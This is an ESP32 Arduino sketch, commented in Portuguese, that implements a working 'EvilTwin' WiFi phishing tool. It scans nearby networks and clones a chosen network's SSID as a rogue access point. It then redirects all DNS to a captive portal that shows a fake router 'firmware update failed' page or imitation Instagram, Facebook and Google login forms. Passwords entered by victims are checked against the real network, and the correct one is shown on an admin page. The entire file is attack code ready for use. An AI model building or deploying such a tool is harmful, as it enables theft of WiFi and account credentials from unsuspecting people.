#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// --- Definições básicas ---
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

DNSServer dnsServer;
WebServer webServer(80);

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";
int selectedTemplate = 0; // 0 = genérico, 1 = Instagram, 2 = Facebook, 3 = Google

bool hotspot_active = false;

// Template HTML base para páginas de admin e index
String _tempHTML = R"rawliteral(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f9f9f9; }
table { border-collapse: collapse; width: 100%; }
th, td { border: 1px solid #ddd; padding: 8px; }
th { background-color: #0066ff; color: white; }
button { padding: 8px 12px; margin: 4px 0; cursor: pointer; }
button[disabled] { background: #ccc; cursor: default; }
</style></head><body>
<h2>Redes WiFi disponíveis</h2>
<table>
<tr><th>SSID</th><th>BSSID</th><th>Canal</th><th>Ação</th></tr>
{networks_rows}
</table>
<br>
<form method='post' action='/'>
<label>Selecionar template:</label>
<select name='template'>
  <option value='0' {sel0}>Padrão</option>
  <option value='1' {sel1}>Instagram</option>
  <option value='2' {sel2}>Facebook</option>
  <option value='3' {sel3}>Google</option>
</select>
<input type='submit' value='Salvar'>
</form>
<br>
<form method='get' action='/admin'>
<button name='hotspot' value='{hotspot}' {disabled}>{hotspot_button}</button>
</form>
<br>
{correct_msg}
</body></html>
)rawliteral";

// Função utilitária para converter MAC em string HEX
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

// Limpa a lista de redes
void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = _Network();
  }
}

// Escaneia redes WiFi e preenche _networks
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

// Gera HTML da tabela de redes
String generateNetworksRows() {
  String rows = "";
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") break;

    String bssidStr = bytesToStr(_networks[i].bssid, 6);
    rows += "<tr><td>" + _networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" + String(_networks[i].ch) + "</td><td>";
    if (bytesToStr(_selectedNetwork.bssid, 6) == bssidStr) {
      rows += "<button disabled>Selecionada</button>";
    } else {
      rows += "<form method='post' action='/' style='margin:0;'><input type='hidden' name='ap' value='" + bssidStr + "'><button type='submit'>Selecionar</button></form>";
    }
    rows += "</td></tr>";
  }
  return rows;
}

// Página index com formulário para senha e template
String index() {
  if (selectedTemplate == 1) {
    // Template Instagram
    return R"rawliteral(
<!DOCTYPE html><html><head><title>Instagram</title>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>body{font-family:sans-serif;background:#fafafa;text-align:center;padding:20px;}
input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}
input[type=submit] {background:#3897f0; color:white; border:none; font-weight:bold; cursor:pointer;}
</style></head><body>
<img src='https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png' width='100'><br><br>
<form action='/' method='post'>
<input type='text' name='username' placeholder='Telefone, nome de usuário ou email' required><br>
<input type='password' name='password' placeholder='Senha' required><br>
<input type='submit' value='Entrar'>
</form>
</body></html>)rawliteral";
  } else if (selectedTemplate == 2) {
    // Template Facebook
    return R"rawliteral(
<!DOCTYPE html><html><head><title>Facebook</title>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>body{font-family:sans-serif;background:#f0f2f5;text-align:center;padding:20px;}
input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}
input[type=submit] {background:#1877f2; color:white; border:none; font-weight:bold; cursor:pointer;}
</style></head><body>
<h1>Facebook</h1><br>
<form action='/' method='post'>
<input type='text' name='username' placeholder='Email ou telefone' required><br>
<input type='password' name='password' placeholder='Senha' required><br>
<input type='submit' value='Entrar'>
</form>
</body></html>)rawliteral";
  } else if (selectedTemplate == 3) {
    // Template Google
    return R"rawliteral(
<!DOCTYPE html><html><head><title>Google</title>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>body{font-family: Arial, sans-serif; background:#fff; text-align:center; padding:20px;}
input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}
input[type=submit] {background:#4285f4; color:white; border:none; font-weight:bold; cursor:pointer;}
</style></head><body>
<img src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg' width='150'><br><br>
<form action='/' method='post'>
<input type='email' name='username' placeholder='Email ou telefone' required><br>
<input type='password' name='password' placeholder='Senha' required><br>
<input type='submit' value='Próximo'>
</form>
</body></html>)rawliteral";
  } else {
    // Template padrão
    String TITLE = "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed";
    String BODY = "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password.";

    String html = "<!DOCTYPE html><html><head><title>" + _selectedNetwork.ssid + " :: " + TITLE + "</title>"
                  "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                  "<style>article { background: #f2f2f2; padding: 1.3em; }"
                  "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                  "div { padding: 0.5em; }"
                  "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
                  "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 10px; border: 1px solid #555555; }"
                  "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                  "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                  "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } </style>"
                  "<meta charset='UTF-8'></head><body>"
                  "<nav><b>" + _selectedNetwork.ssid + "</b> ACCESS POINT RESCUE MODE</nav>"
                  "<div><h1>" + TITLE + "</h1></div>"
                  "<div>" + BODY + "</div>"
                  "<form action='/' method='post'>"
                  "<label>WiFi password:</label>"
                  "<input type='password' name='password' minlength='8'>"
                  "<input type='submit' value='Continue'>"
                  "</form>"
                  "</body></html>";
    return html;
  }
}

// Handlers para as rotas
void handleIndex() {
  // Seleção de template pelo POST ou GET
  if (webServer.hasArg("template")) {
    selectedTemplate = webServer.arg("template").toInt();
  }
  // Selecionar rede pela POST
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
  }

  // Caso o hotspot esteja ativo, verificar senha e tentar conectar
  if (hotspot_active && webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");
    WiFi.disconnect();
    delay(500);
    WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());

    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
                      "<script>setTimeout(function(){window.location.href = '/result';}, 10000);</script></head>"
                      "<body><center><h2>Verificando a senha, aguarde...</h2></center></body></html>");
    return;
  }

  // Mostra o formulário de senha e seleção de template
  webServer.send(200, "text/html", index());
}

void handleResult() {
  String msg;
  if (WiFi.status() == WL_CONNECTED) {
    _correct = "Senha correta para a rede: " + _selectedNetwork.ssid + " Senha: " + _tryPassword;
    hotspot_active = false;
    msg = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
          "<body><center><h2>Senha correta! Conectado.</h2></center></body></html>";
  } else {
    msg = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
          "<body><center><h2>Senha incorreta, tente novamente.</h2>"
          "<script>setTimeout(function(){window.location.href = '/';}, 4000);</script></center></body></html>";
  }
  webServer.send(200, "text/html", msg);
}

void handleAdmin() {
  // Permite ativar/desativar hotspot pela URL
  if (webServer.hasArg("hotspot")) {
    String val = webServer.arg("hotspot");
    if (val == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid == "" ? "WiPhi_DEDSEC" : _selectedNetwork.ssid.c_str(), "123456789");
      dnsServer.start(DNS_PORT, "*", apIP);
    } else if (val == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_DEDSEC", "123456789");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
  }

  // Gera a lista das redes no HTML
  String rows = generateNetworksRows();

  String html = _tempHTML;
  html.replace("{networks_rows}", rows);

  // Substitui placeholders do template
  html.replace("{sel0}", selectedTemplate == 0 ? "selected" : "");
  html.replace("{sel1}", selectedTemplate == 1 ? "selected" : "");
  html.replace("{sel2}", selectedTemplate == 2 ? "selected" : "");
  html.replace("{sel3}", selectedTemplate == 3 ? "selected" : "");

  if (hotspot_active) {
    html.replace("{hotspot_button}", "Parar EvilTwin");
    html.replace("{hotspot}", "stop");
    html.replace("{disabled}", "");
  } else {
    html.replace("{hotspot_button}", "Iniciar EvilTwin");
    html.replace("{hotspot}", "start");
    html.replace("{disabled}", _selectedNetwork.ssid == "" ? "disabled" : "");
  }

  String correctMsg = "";
  if (_correct != "") {
    correctMsg = "<h3>" + _correct + "</h3>";
  }
  html.replace("{correct_msg}", correctMsg);

  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);

  // Configura WiFi em modo AP+STA
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_DEDSEC", "123456789");

  // Inicializa DNS Server para captive portal (redirige tudo para o IP do AP)
  dnsServer.start(DNS_PORT, "*", apIP);

  // Escaneia as redes inicialmente
  performScan();

  // Configura rotas do servidor web
  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/", HTTP_POST, handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);

  webServer.begin();

  Serial.println("Servidor iniciado!");
  Serial.print("IP do AP: ");
  Serial.println(apIP);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Aqui poderia colocar atualização periódica do scan de redes, por exemplo a cada 15s:
  static unsigned long lastScan = 0;
  if (millis() - lastScan > 15000) {
    performScan();
    lastScan = millis();
  }
}
